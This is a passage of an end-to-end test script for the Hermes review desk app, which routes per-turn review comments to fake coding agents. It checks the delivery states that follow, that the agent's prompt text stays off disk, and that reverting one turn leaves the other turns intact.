  await openDesk(bridge, "sidebar");
  assert((await fileRows(bridge)).find((r) => r.path === "src/app.js")?.viewed === true, "src/app.js is still ticked after reopening from the sidebar button");

  log("step 4: by turn — T1 is Agent A's, T2 is Agent B's, T3 is Agent C's; comments are routed to the agent that made the turn");
  await bridge.clickByName("By turn", { within: ".review-group" });
  await bridge.waitFor("the turn list", `return e2e.all(".review-turn-row").length === 3;`);
  // The list can re-render as the turns load again; read it once it holds three.
  let turns = await turnRows(bridge);
  for (let i = 0; i < 20 && turns.length !== 3; i++) {
    await sleep(250);
    turns = await turnRows(bridge);
  }
  log(`  turns: ${JSON.stringify(turns)}`);
  assert(turns[0].n === 1 && turns[0].session === idA && turns[0].agent === "Agent A", "T1 belongs to Agent A");
  assert(turns[1].n === 2 && turns[1].session === idB && turns[1].agent === "Agent B", "T2 belongs to Agent B");
  assert(turns[2].n === 3 && turns[2].session === idC && turns[2].agent === "Agent C", "T3 belongs to Agent C");
  await bridge.click(`.review-turn-row[data-turn="2"]`);
  await bridge.waitFor("turn 2's files", `return e2e.all(".review-turn-file").length === 3;`);
  const c1 = await commentOn(bridge, "src/util.js", "Please do not use eval here; parse the number instead.");
  assert(c1.session === idB && c1.turn === 2 && /to Agent B/.test(c1.route), `the comment on turn 2's line is routed to Agent B (${c1.route})`);
  await bridge.click(`.review-turn-row[data-turn="1"]`);
  await bridge.waitFor("turn 1's file", `return e2e.all(".review-turn-file").length === 1;`);
  const c2 = await commentOn(bridge, "src/app.js", "Why 3? The spec says 2.");
  assert(c2.session === idA && c2.turn === 1 && /to Agent A/.test(c2.route), `the comment on turn 1's line is routed to Agent A (${c2.route})`);
  await bridge.screenshot(join(evidenceDir, "02-by-turn-with-comments.png"));

  log("step 5: Send to Agent A — one tagged line reaches A's terminal, its prompt hook reports it, Hermes shows delivered");
  await untilNotWorking(bridge, idA, "Agent A");
  await bridge.click(`.review-send[data-session="${idA}"] .review-send-btn`);
  const deliveredA = await bridge.waitFor("delivery to Agent A", `
    const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-state") === "delivered");
    return d ? { n: Number(d.getAttribute("data-n")), text: e2e.norm(d.textContent) } : null;
  `, { timeoutMs: 15_000 });
  assert(deliveredA.n === 1, `Hermes shows "${deliveredA.text}"`);
  const promptsA = await waitForPrompts(idA, 1);
  assert(promptsA.length === 1 && promptsA[0].startsWith("[hermes-review #1] "), `Agent A received exactly one line, tagged: "${promptsA[0].slice(0, 60)}…"`);
  const fileA = join(app.dataDir, "reviews", idA, "review-1.md");
  assert(existsSync(fileA), `review-1.md was written for Agent A (${fileA})`);
  const mdA = readFileSync(fileA, "utf8");
  assert(mdA.includes("# Review 1 for Agent A") && mdA.includes("Why 3? The spec says 2.") && mdA.includes("## src/app.js") && !mdA.includes("eval here"), "the review file holds Agent A's comment and not Agent B's");
  assert(promptsA[0].includes(fileA.replace(/\\/g, "/")) || promptsA[0].includes(fileA), "the pasted line names the review file");
  assert((recordOf(idA).hooksRan ?? []).some((h) => h.event === "UserPromptSubmit"), "Agent A ran its prompt hook (hi signal) for the line");
  // Data safety: the helper writes only the marker to the spool, never the prompt text.
  const spoolA = readFileSync(recordOf(idA).env.HERMES_SIGNAL_FILE, "utf8");
  assert(spoolA.includes('"hermes_tags":["hermes-review#1"]'), "the spool line for the prompt carries the marker as hermes_tags");
  assert(!spoolA.includes("Please read the review") && !spoolA.includes('"prompt"'), "no prompt text reaches the on-disk spool");
  assert(((recordOf(idB) ?? {}).prompts ?? []).length === 0 && ((recordOf(idC) ?? {}).prompts ?? []).length === 0, "Agent B's and Agent C's terminals received nothing");
  await bridge.screenshot(join(evidenceDir, "03-delivered-to-agent-a.png"));

  log("step 6: Send to Agent B — the line arrives, no signal comes back, Hermes shows not delivered with Retry");
  await untilNotWorking(bridge, idB, "Agent B");
  await bridge.click(`.review-send[data-session="${idB}"] .review-send-btn`);
  const sendingB = await bridge.waitFor("the send to start", `
    const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "2");
    return d ? d.getAttribute("data-state") : null;
  `);
  log(`  delivery 2 state right after Send: ${sendingB}`);
  const notDelivered = await bridge.waitFor("not delivered for Agent B", `
    const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "2" && el.getAttribute("data-state") === "not_delivered");
    return d ? { text: e2e.norm(d.textContent), retry: !!d.querySelector(".review-retry-btn") } : null;
  `, { timeoutMs: 15_000 });
  assert(notDelivered.retry, `Hermes shows "${notDelivered.text}" with a Retry button`);
  const promptsB = await waitForPrompts(idB, 1);
  assert(promptsB[0].startsWith("[hermes-review #2] "), "the line did reach Agent B's terminal (the vendor just never reported it)");
  assert(!(recordOf(idB).hooksRan ?? []).some((h) => h.event === "UserPromptSubmit"), "Agent B ran no prompt hook, so nothing could confirm delivery");
  assert((await waitForPrompts(idA, 1)).length === 1, "Agent A did not get Agent B's line");
  await bridge.screenshot(join(evidenceDir, "04-not-delivered-to-agent-b.png"));
  await bridge.click(".review-retry-btn");
  await bridge.waitFor("the retry to run", `
    const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "2");
    return d && d.getAttribute("data-state") === "sending" ? true : null;
  `, { timeoutMs: 5_000 }).catch(() => log("  (the retry settled before it could be seen as sending)"));
  await bridge.waitFor("not delivered again", `
    const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "2");
    return d && d.getAttribute("data-state") === "not_delivered" ? true : null;
  `, { timeoutMs: 15_000 });
  const promptsB2 = await waitForPrompts(idB, 2);
  assert(promptsB2[1] === promptsB2[0], "Retry pasted the same tagged line again");

  log("step 6b: Send to Agent A while it works — nothing is typed into a busy agent, not even when its turn ends; only Send now pastes");
  await bridge.click(`.review-turn-row[data-turn="1"]`);
  await bridge.waitFor("turn 1's file", `return e2e.all(".review-turn-file").length === 1;`);
  const c3 = await commentOn(bridge, "src/app.js", "Add a comment saying why it is 3.");
  assert(c3.session === idA, "a new comment for Agent A");
  const idleA = await untilNotWorking(bridge, idA, "Agent A");
  assert(idleA.kind !== "working", `Agent A is not working before the turn (${idleA.kind}, ${idleA.confidence})`);
  // The person gives Agent A a long turn (the fake works 8 s, then runs its Stop hook).
  await typeInto(bridge, idA, "work 8000\r");
  const busyA = await bridge.waitFor("Agent A's status to be working (exact, from its prompt hook)", `
    const s = window.__HERMES_E2E__.sessionStatus(${JSON.stringify(idA)});
    return s.kind === "working" && s.confidence === "exact" ? { kind: s.kind, confidence: s.confidence, source: s.source } : null;
  `, { timeoutMs: 10_000 });
  log(`  Agent A: ${JSON.stringify(busyA)}`);
  const promptsBefore = (await waitForPrompts(idA, 2)).length;
  await bridge.click(`.review-send[data-session="${idA}"] .review-send-btn`);
  const sendNowState = (bridge) => bridge.eval(`
    const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "3");
    if (!d) return null;
    const b = d.querySelector(".review-send-now-btn");
    return { state: d.getAttribute("data-state"), text: e2e.norm(d.textContent), sendNow: b ? { disabled: b.disabled, busy: b.getAttribute("data-busy") } : null };
  `);
  const waiting = await bridge.waitFor("the send to wait for the turn", `
    const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "3" && el.getAttribute("data-state") === "waiting");
    return d ? e2e.norm(d.textContent) : null;
  `, { timeoutMs: 5_000 });
  log(`  Hermes shows "${waiting}"`);
  const whileWorking = await sendNowState(bridge);
  assert(whileWorking.sendNow && whileWorking.sendNow.disabled === true, `Send now is off while Agent A works (${JSON.stringify(whileWorking.sendNow)})`);
  await sleep(2_000);
  assert((recordOf(idA).prompts ?? []).length === promptsBefore, "while Agent A worked, nothing was typed into it");
  assert(!(await bridge.exists(".review-delivery[data-n='3'][data-state='delivered']")), "review 3 is not delivered yet");
  // The turn ends (the fake's Stop hook): Hermes still types nothing by itself.
  const endedA = await bridge.waitFor("Agent A's turn to end", `
    const s = window.__HERMES_E2E__.sessionStatus(${JSON.stringify(idA)});
    return s.kind !== "working" ? { kind: s.kind, confidence: s.confidence, source: s.source } : null;
  `, { timeoutMs: 20_000 });
  log(`  Agent A after its turn: ${JSON.stringify(endedA)}`);
  const sendNowOn = await bridge.waitFor("Send now to come on once the turn ended", `
    const b = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "3")?.querySelector(".review-send-now-btn");
    return b && !b.disabled ? true : null;
  `, { timeoutMs: 5_000 });
  assert(sendNowOn === true, "Send now is on once Agent A's turn ended");
  await sleep(1_500);
  const afterTurn = await sendNowState(bridge);
  assert(afterTurn.state === "waiting", `review 3 still waits for the person after the turn (${afterTurn.state})`);
  assert((recordOf(idA).prompts ?? []).length === promptsBefore, "after the turn ended, Hermes still typed nothing into Agent A on its own");
  await bridge.screenshot(join(evidenceDir, "04b-waiting-send-now.png"));
  await bridge.clickWhenReady(`
    const b = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "3")?.querySelector(".review-send-now-btn");
    return e2e.click(e2e.must(b, "the Send now button"));
  `);
  const deliveredA3 = await bridge.waitFor("delivery of review 3 after Send now", `
    const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "3");
    return d && d.getAttribute("data-state") === "delivered" ? e2e.norm(d.textContent) : null;
  `, { timeoutMs: 15_000 });
  log(`  Hermes shows "${deliveredA3}"`);
  const promptsA3 = await waitForPrompts(idA, promptsBefore + 1);
  assert(promptsA3.length === promptsBefore + 1 && promptsA3[promptsBefore].startsWith("[hermes-review #3] "), "exactly one tagged line for review 3 reached Agent A, on Send now");
  const evs = recordOf(idA).events ?? [];
  const iWork = evs.findIndex((e) => e.ev === "working");
  const iEnd = evs.findIndex((e, i) => i > iWork && e.ev === "turn-end");
  const iLine = evs.findIndex((e, i) => i > iWork && e.ev === "prompt");
  assert(iWork >= 0 && iEnd > iWork && iLine > iEnd, `the fake read the line only after its turn ended (working@${iWork}, turn-end@${iEnd}, prompt@${iLine})`);
  const afterA = await statusOf(bridge, idA);
  log(`  Agent A after the receipt: ${JSON.stringify(afterA)}`);
  await bridge.screenshot(join(evidenceDir, "04c-sent-now-after-the-turn.png"));

  log("step 6c: Send to Agent C — a vendor whose launch installs no prompt hook: the line arrives, Hermes says pasted (cannot confirm), not not-delivered");
  await bridge.click(`.review-turn-row[data-turn="3"]`);
  await bridge.waitFor("turn 3's file", `return e2e.all(".review-turn-file").length === 1;`);
  const c4 = await commentOn(bridge, "README.md", "Say which test command exactly.");
  assert(c4.session === idC && c4.turn === 3 && /to Agent C/.test(c4.route), `the comment on turn 3's line is routed to Agent C (${c4.route})`);
  await bridge.click(`.review-send[data-session="${idC}"] .review-send-btn`);
  const pastedC = await bridge.waitFor("the pasted outcome for Agent C", `
    const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "4");
    return d && d.getAttribute("data-state") === "pasted" ? { text: e2e.norm(d.textContent), retry: !!d.querySelector(".review-retry-btn"), copy: !!d.querySelector(".review-copy-line-btn") } : null;
  `, { timeoutMs: 15_000 });
  assert(!pastedC.retry && pastedC.copy, `Hermes shows "${pastedC.text}" with Copy line and no Retry`);
  const promptsC = await waitForPrompts(idC, 1);
  assert(promptsC.length === 1 && promptsC[0].startsWith("[hermes-review #4] "), "the tagged line reached Agent C's terminal once");
  // The fake records the event even with nothing to run: what matters is that no hook command ran.
  assert(!(recordOf(idC).hooksRan ?? []).some((h) => h.event === "UserPromptSubmit" && (h.results ?? []).length > 0), "Agent C ran no prompt hook command (none was installed)");
  await sleep(6_000);
  const stillPasted = await bridge.eval(`return e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "4")?.getAttribute("data-state");`);
  assert(stillPasted === "pasted", `after the receipt window review 4 still reads pasted, never not-delivered (${stillPasted})`);
  await bridge.screenshot(join(evidenceDir, "04d-pasted-cannot-confirm.png"));

  log("step 7: revert turn 2 — preview, apply, and turns 1 and 3 stay intact");
  await bridge.click(`.review-turn-row[data-turn="2"]`);
  await bridge.waitFor("turn 2 selected", `return e2e.first('.review-turn-row[data-turn="2"]')?.classList.contains("review-row-selected");`);
  await bridge.click(".review-revert-btn");
  const preview = await bridge.waitFor("the revert preview", `
    const p = e2e.first(".review-revert-preview");
    if (!p || !p.querySelector(".review-revert-clean")) return null;
    return { clean: p.querySelector(".review-revert-clean").getAttribute("data-clean"), files: [...p.querySelectorAll(".review-revert-files li")].map((li) => li.getAttribute("data-path")).sort() };
  `, { timeoutMs: 15_000 });
  assert(preview.clean === "1", "the preview says the revert applies cleanly");
  assert(JSON.stringify(preview.files) === JSON.stringify([".github/workflows/ci.yml", "package-lock.json", "src/util.js"]), "the preview lists exactly turn 2's three files");
  await bridge.screenshot(join(evidenceDir, "05-revert-preview.png"));
  await bridge.click(".review-revert-confirm");
  await bridge.waitFor("the revert to finish", `return !e2e.first(".review-revert-preview") && !!e2e.first(".review-notice");`, { timeoutMs: 20_000 });
  assert(read("src/util.js") === BASE["src/util.js"], "src/util.js is back at the base");
  assert(read("package-lock.json") === BASE["package-lock.json"], "package-lock.json is back at the base");
  assert(read(".github/workflows/ci.yml") === BASE[".github/workflows/ci.yml"], "the workflow is back at the base");
  assert(read("src/app.js") === "const a = 1;\nconst b = 3;\nexport default a + b;\n", "turn 1's change to src/app.js is intact");
  assert(read("README.md").includes("Run `npm test`"), "turn 3's change to README.md is intact");
  const status = git("status", "--porcelain").trimEnd().split(/\r?\n/).sort();
  assert(JSON.stringify(status) === JSON.stringify([" M README.md", " M src/app.js"]), `git status shows only turns 1 and 3 (${JSON.stringify(status)})`);
  await bridge.clickByName("By file", { within: ".review-group" });
  await bridge.waitFor("the by-file list to shrink to two files", `
    const p = e2e.all(".review-file-row").map((r) => r.getAttribute("data-path")).sort();
    return p.length === 2 && p[0] === "README.md" && p[1] === "src/app.js";
  `, { timeoutMs: 15_000 });
  assert(true, "the desk now lists only README.md and src/app.js");
  await bridge.screenshot(join(evidenceDir, "06-after-revert.png"));
  await closeDesk(bridge);
} catch (e) {
  failed = true;
  log(`FAILED: ${e?.stack ?? e}`);
  try {
    if (app?.isRunning()) {
      await app.bridge.screenshot(join(evidenceDir, "99-failure.png"));
      const dump = await app.bridge.eval(`
        return {
          desk: !!e2e.first(".review-desk"),
          buttons: e2e.all("button").map(e2e.nameOf).slice(0, 40),
          deliveries: e2e.all(".review-delivery").map((el) => ({ n: el.getAttribute("data-n"), state: el.getAttribute("data-state"), text: e2e.norm(el.textContent) })),
          terminals: window.__HERMES_E2E__.terminalIds().map((id) => ({ id, tail: (window.__HERMES_E2E__.readTerminal(id) || []).slice(-8) })),
        };
      `);
      log(`  what the app showed: ${JSON.stringify(dump)}`);
    }
  } catch (inner) {
    log(`  (could not capture failure evidence: ${inner.message})`);
  }
} finally {
  if (app?.isRunning()) {
    log("quit the app");
    const exit = await app.stop();
    log(`  app exited: ${JSON.stringify(exit)}`);
    if (!failed && (exit.forced || exit.code !== 0)) {
      failed = true;
      log("FAILED: the app did not quit cleanly");
    }
  }
  try {
    undoRegistryPath?.();
  } catch (e) {
    log(`  (could not restore the registry Path: ${e.message})`);
  }
  try {
    cpSync(recordDir, join(evidenceDir, "fake-launch-records"), { recursive: true });
  } catch {
    /* best effort */
  }
  rmSync(work, { recursive: true, force: true, maxRetries: 10, retryDelay: 200 });
}

finishScenario({ scenario: SCENARIO, evidenceDir, failed, startedAt, log });
